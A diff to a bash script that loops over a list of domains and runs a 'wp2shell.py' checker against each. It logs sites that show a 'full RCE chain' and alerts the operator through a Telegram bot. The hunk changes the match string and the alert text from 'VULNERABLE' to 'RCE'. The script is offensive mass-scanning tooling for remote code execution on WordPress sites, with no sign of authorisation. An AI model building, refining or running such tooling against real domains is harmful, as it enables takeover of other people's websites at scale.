@@ -20,12 +20,12 @@ while IFS= read -r domain || [[ -n "$domain" ]]; do
 
   result=$(python3 "$SCRIPT_DIR/wp2shell.py" check "https://$domain" 2>&1)
 
-  if echo "$result" | grep -q "CONFIRMED\|VULNERABLE"; then
+  if echo "$result" | grep -q "full RCE chain"; then
     echo "🔴 $domain"
     echo "$domain" >> "$RESULTS_DIR/confirmed.txt"
     curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
       -d chat_id="$TG_CHAT_ID" \
-      -d text="🔴 VULNERABLE — $domain" > /dev/null 2>&1
+      -d text="🔴 RCE — $domain" > /dev/null 2>&1
   else
     echo "⚪ $domain"
     echo "$domain" >> "$RESULTS_DIR/not-vuln.txt"
